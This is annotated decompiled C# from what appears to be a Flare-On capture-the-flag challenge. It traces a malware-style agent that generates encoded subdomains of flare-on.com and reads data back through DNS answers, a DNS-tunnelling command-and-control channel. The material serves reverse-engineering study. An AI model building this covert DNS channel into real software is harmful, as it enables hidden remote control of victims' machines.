// Main loop - the state machine:

		// Token: 0x06000068 RID: 104 RVA: 0x00003F0C File Offset: 0x0000AF0C
		public static void flared_38(string[] args)
		{
			bool flag;
			using (new Mutex(true, "e94901cd-77d9-44ca-9e5a-125190bcf317", ref flag))
			{
				bool flag2 = flag;
				if (flag2)
				{
					FLARE13 flare = new FLARE13();
					FLARE13.flared_48();
					FLARE03.flared_06();
					for (;;)
					{
						try
						{
							switch (FLARE13.cs)
							{
							case FLARE08.A:
								FLARE13.flared_50(FLARE07.A); // A -> C
								break;
							case FLARE08.B:
								FLARE13.flared_50(Program.flared_39()); // B -> A
								break;
							case FLARE08.C:
								FLARE13.flared_50(FLARE05.flared_19()); // query the domain 1
								break;
							case FLARE08.D:
								FLARE13.flared_50(FLARE05.flared_20()); // query the domain 2
								break;
							case FLARE08.E:
								FLARE13.flared_50(FLARE14.flare_52()); //N
								break;
							case FLARE08.F:
								FLARE13.flared_50(FLARE05.flare_21()); //N
								break;
							case FLARE08.G:
								FLARE13.flared_50(FLARE05.flare_22());//N
									break;
							case FLARE08.H:
								FLARE13.flared_50(Program.flare_73());//N
									break;
							}
						}
						catch (Exception ex)
						{
							try
							{
							}
							catch
							{
							}
						}
						Thread.Sleep(1);
					}
				}
			}
		}

		// Token: 0x0600006A RID: 106 RVA: 0x00004094 File Offset: 0x0000B094
		public static FLARE07 flared_39()
		{
			FLARE15.flared_65(FLARE06.DT.C);
			return FLARE07.A;
		}
		
// State transition:

		// Token: 0x06000088 RID: 136 RVA: 0x000048DC File Offset: 0x0000B8DC
		public static FLARE08 flared_50(FLARE07 c) // state transition
		{
			FLARE13.cs = FLARE13.flared_49(c);
			return FLARE13.cs;
		}
		
// Check if the state transition is legal:

		// Token: 0x06000086 RID: 134 RVA: 0x00004828 File Offset: 0x0000B828
		public static FLARE08 flared_49(FLARE07 c)
		{
			FLARE13.FLARE16 key = new FLARE13.FLARE16(FLARE13.cs, c);
			FLARE08 result;
			bool flag = !FLARE13.t.TryGetValue(key, out result);
			if (flag)
			{
				throw new Exception("Invalid transition: " + FLARE13.cs.ToString() + " -> " + c.ToString());
			}
			return result;
		}
		
// Domain resolution ( -> state D )

		// Token: 0x0600002F RID: 47 RVA: 0x00002FA0 File Offset: 0x00009FA0
		public static FLARE07 FLARE05.flared_19()
		{
			FLARE07 ret = FLARE07.B;
			bool flag = FLARE03.flared_10() != null || FLARE05.flared_31(new Func<bool>(FLARE05.flare_27));
			if (flag)
			{
				FLARE05.flared_31(() => FLARE05.flared_26(out ret));
			}
			return ret;
		}
		
		// Token: 0x0600003D RID: 61 RVA: 0x000035B8 File Offset: 0x0000A5B8
		public static bool flared_26(out FLARE07 r)
		{
			FLARE05.flare_29(FLARE06.DomT.E, string.Empty);
			r = FLARE07.B;
			byte[] r2;
			// query the domain:
			bool flag = FLARE05.flared_30(out r2);
			bool flag2 = flag && FLARE05.flared_33(r2);
			if (flag2)
			{
				r = FLARE07.C;
			}
			return flag;
		}

		// Token: 0x0600004B RID: 75 RVA: 0x00003AA0 File Offset: 0x0000AAA0
		public static bool flared_33(byte[] r)
		{
			bool flag = r[0] >= 128;
			bool result;
			if (flag)
			{
				FLARE05.D = 0;
				FLARE05.C = FLARE15.flared_62(r.Skip(1).Take(3).ToArray<byte>());
				FLARE05.E = new byte[FLARE05.C];
				result = true;
			}
			else
			{
				result = false;
			}
			return result;
		}
		
		// Token: 0x060000AA RID: 170 RVA: 0x00012940 File Offset: 0x00019940
		public static int flared_62(byte[] v)
		{
			return BitConverter.ToInt32(FLARE15.flared_64(v), 0);
		}
		
		// Token: 0x060000AE RID: 174 RVA: 0x00012A40 File Offset: 0x00019A40
		public static byte[] flared_64(byte[] v)
		{
			bool isLittleEndian = BitConverter.IsLittleEndian;
			byte[] result;
			if (isLittleEndian)
			{
				Array.Reverse(v);
				result = v.Concat(new byte[1]).ToArray<byte>();
			}
			else
			{
				result = new byte[1].Concat(v).ToArray<byte>();
			}
			return result;
		}
		
// To query the domain:

		// Token: 0x06000031 RID: 49 RVA: 0x0000303C File Offset: 0x0000A03C
		public static FLARE07 flared_20()
		{
			FLARE07 ret = FLARE07.B;
			Func<bool> <>9__0;
			for (;;)
			{
				bool flag;
				if (FLARE05.D < FLARE05.C)
				{
					Func<bool> fn;
					if ((fn = <>9__0) == null)
					{
						fn = (<>9__0 = (() => FLARE05.flared_23(out ret)));
					}
					flag = FLARE05.flared_31(fn);
				}
				else
				{
					flag = false;
				}
				if (!flag)
				{
					break;
				}
				FLARE15.flared_65(FLARE06.DT.B);
			}
			return ret;
		}

// Repeat querying the domain:

		// Token: 0x06000047 RID: 71 RVA: 0x00003900 File Offset: 0x0000A900
		public static bool flared_31(Func<bool> fn)
		{
			bool result = false;
			FLARE05.B = 0;
			while (!fn() && FLARE05.B < FLARE03.max_try)
			{
				FLARE15.flared_65(FLARE06.DT.D);
			}
			bool flag = FLARE05.B >= FLARE03.max_try;
			if (flag)
			{
				FLARE05.B = 0;
				// increment FLARE03._counter, write the counter to flare.agent.id
				FLARE03.flared_08();
			}
			else
			{
				result = true;
			}
			return result;
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002788 File Offset: 0x00009788
		public static void FLARE03.flared_08()
		{
			FLARE03._counter++;
			bool flag = FLARE03._counter >= FLARE03._max_counter;
			if (flag)
			{
				FLARE03._counter = 0;
			}
			// write the counter to flare.agent.id
			FLARE03.flared_11();
		}
		
		// Token: 0x060000B0 RID: 176 RVA: 0x00012ACC File Offset: 0x00019ACC
		public static void flared_65(FLARE06.DT d)
		{
			int mn = 1;
			int mx = 1;
			switch (d)
			{
			case FLARE06.DT.A:
				mn = FLARE03.min_alive_delay;
				mx = FLARE03.max_alive_delay;
				break;
			case FLARE06.DT.B:
				mn = FLARE03.min_comm_delay;
				mx = FLARE03.max_comm_delay;
				break;
			case FLARE06.DT.C:
				mn = FLARE03.min_check_delay;
				mx = FLARE03.max_check_delay;
				break;
			case FLARE06.DT.D:
				mn = FLARE03.min_retry_delay;
				mx = FLARE03.max_retry_delay;
				break;
			}
			Thread.Sleep(FLARE10.flared_41(mn, mx));
		}

		// Token: 0x06000071 RID: 113 RVA: 0x00004144 File Offset: 0x0000B144
		public static int flared_41(int mn, int mx)
		{
			bool flag = mn > mx;
			if (flag)
			{
				mn = mx;
			}
			return FLARE10.r.Next(mn, mx + 1);
		}
		
// Domain resolution ( -> state D )

		// Token: 0x06000037 RID: 55 RVA: 0x00003240 File Offset: 0x0000A240
		public static bool flared_23(out FLARE07 r)
		{
			// make the domain name:
			FLARE05.flared_29(FLARE06.DomT.C, FLARE15.flare_60(FLARE05.D).PadLeft(3, FLARE03.chars_domain[0]));
			r = FLARE07.B;
			byte[] d;
			// query the domain, i.e. "2gc20vjb1h4.flare-on.com"
			bool flag = FLARE05.flared_30(out d);
			
			// verify the received IP address:
			bool flag2 = flag && FLARE05.flared_32(d);
			if (flag2)
			{
				// change the state
				r = FLARE07.D;
			}
			return flag;
		}


// Verify the received IP address:

		// Token: 0x06000049 RID: 73 RVA: 0x000039AC File Offset: 0x0000A9AC
		public static bool flared_32(byte[] d)
		{
			int val = FLARE05.C - FLARE05.D;
			ushort length = (ushort)Math.Min(d.Length, val);
			Array.Copy(d, 0, FLARE05.E, FLARE05.D, (int)length);
			FLARE05.D += 4;
			bool flag = FLARE05.D >= FLARE05.C;
			bool result;
			if (flag)
			{
				byte[] array = new byte[FLARE05.C];
				Array.Copy(FLARE05.E, 0, array, 0, FLARE05.C);
				FLARE14.ListData.Add(array);
				FLARE05.D = 0;
				FLARE05.C = 0;
				Array.Clear(FLARE05.E, 0, FLARE05.E.Length);
				result = true;
			}
			else
			{
				result = false;
			}
			return result;
		}

// Querying the domain:

		// Token: 0x06000045 RID: 69 RVA: 0x00003820 File Offset: 0x0000A820
		public static bool flared_30(out byte[] r)
		{
			bool result = true;
			r = null;
			try
			{
				IPHostEntry iphostEntry = Dns.Resolve(FLARE05.A);
				r = iphostEntry.AddressList[0].GetAddressBytes();
				FLARE05.B = 0;
				FLARE03.flared_08();
			}
			catch
			{
				FLARE05.B++;
				result = false;
			}
			return result;
		}
		
// Write the counter to flare.agent.id:

		// Token: 0x0600001C RID: 28 RVA: 0x000028A4 File Offset: 0x000098A4
		public static bool FLARE03.flared_11()
		{
			try
			{
				File.WriteAllText("flare.agent.id", ((FLARE03._agent_id != null) ? FLARE03._agent_id.Value.ToString() : "-") + Environment.NewLine + FLARE03._counter.ToString());
			}
			catch (Exception ex)
			{
				return false;
			}
			return true;
		}
	
		
// Making the domain address:

		// Token: 0x06000043 RID: 67 RVA: 0x00003708 File Offset: 0x0000A708
		public static void flared_29(FLARE06.DomT dt, string d)
		{
			bool flag = FLARE05.B == 0;
			if (flag)
			{
				bool flag2 = dt == FLARE06.DomT.E;
				if (flag2)
				{
					FLARE05.A = FLARE15.flared_60(FLARE03.flared_10().Value);
				}
				else
				{
					bool flag3 = dt == FLARE06.DomT.A;
					if (flag3)
					{
						FLARE05.A = FLARE15.flared_60((int)dt) + d;
					}
					else
					{
						FLARE05.A = FLARE15.flared_60((int)dt) + FLARE15.flared_60(FLARE03.flared_10().Value) + d;
					}
				}
				// generate the string from the seed:
				string s = FLARE15.flared_58(FLARE03.flared_09()); // example: "2l3ovgu7saxctbjwq01r6izhekpdnfy945m8"
				
				FLARE05.A = FLARE15.flared_59(FLARE05.A, s) + FLARE15.flared_61(FLARE03.flared_09()).PadLeft(3, FLARE03.chars_counter[0]) + "." + FLARE03.flared_13();
			}
		}
		
		// Token: 0x060000A8 RID: 168 RVA: 0x000128D8 File Offset: 0x000198D8
		public static string flared_61(int v)
		{
			return FLARE15.flared_63(v, FLARE03.chars_counter);
		}

// Translate string to the charset:

		// Token: 0x060000A4 RID: 164 RVA: 0x000127D0 File Offset: 0x000197D0
		public static string FLARE15.flared_59(string d, string s)
		{
			// example: d = "aflareon"; s = "2l3ovgu7saxctbjwq01r6izhekpdnfy945m8";
			string text = string.Empty;
			for (int i = 0; i < d.Length; i++)
			{
				text += s[FLARE03.chars_domain.IndexOf(d[i])].ToString();
			}
			// text = "2gc20vjb" -> 1-st part of the domain: "2gc20vjb1h4.flare-on.com"
			return text;
		}

// Fetch the FLARE03._counter
		// Token: 0x06000018 RID: 24 RVA: 0x000027FC File Offset: 0x000097FC
		public static int flared_09()
		{
			return FLARE03._counter;
		}
		
// Generate the string from the seed:

		// Token: 0x060000A2 RID: 162 RVA: 0x00012708 File Offset: 0x00019708
		public static string flared_58(int s)
		{
			string text = FLARE03.chars_domain;
			int length = text.Length;
			string text2 = string.Empty;
			FLARE11 flare = new FLARE11();
			FLARE11.flare_41((uint)s);
			for (int i = 0; i < length; i++)
			{
				int num = FLARE11.flare_44(0, text.Length);
				text2 += text[num].ToString();
				text = text.Remove(num, 1);
			}
			return text2;
		}
		
		// Token: 0x060000AC RID: 172 RVA: 0x000129A4 File Offset: 0x000199A4
		public static string flared_63(int v, string b)
		{
			// example: b = "amsjl6zci20dbt35guhw7n1fqvx4k8y9rpoe", v = 0x00007203;
			string text = string.Empty;
			int length = b.Length;
			do
			{
				text = b[v % length].ToString() + text;
				v /= length;
			}
			while (v > 0);
			
			// text = "1h4" -> 2-nd part of the domain: "2gc20vjb1h4.flare-on.com"
			return text;
		}
		
		// Token: 0x060000A6 RID: 166 RVA: 0x00012870 File Offset: 0x00019870
		public static string flared_60(int v)
		{
			return FLARE15.flared_63(v, FLARE03.chars_counter);
		}
		
		// Token: 0x0600001A RID: 26 RVA: 0x00002850 File Offset: 0x00009850
		public static int? flared_10()
		{
			return FLARE03._agent_id;
		}
		

		// Token: 0x06000020 RID: 32 RVA: 0x00002A28 File Offset: 0x00009A28
		public static string flared_13()
		{
			int num = FLARE10.flared_41(0, FLARE03._domains.Length - 1);
			return FLARE03._domains[num];
		}
		
		// Token: 0x06000071 RID: 113 RVA: 0x00004144 File Offset: 0x0000B144
		public static int FLARE10.flared_41(int mn, int mx)
		{
			bool flag = mn > mx;
			if (flag)
			{
				mn = mx;
			}
			return FLARE10.r.Next(mn, mx + 1);
		}
		
		// Constants:
		
		// Token: 0x0400000E RID: 14
		public static string chars_domain = "abcdefghijklmnopqrstuvwxyz0123456789";

		// Token: 0x0400000F RID: 15
		public static string chars_counter = "amsjl6zci20dbt35guhw7n1fqvx4k8y9rpoe";

		// Token: 0x04000010 RID: 16
		public static string alive_key = "flareon";

		// Token: 0x04000011 RID: 17
		public static string[] _domains = new string[]
		{
			"flare-on.com"
		};
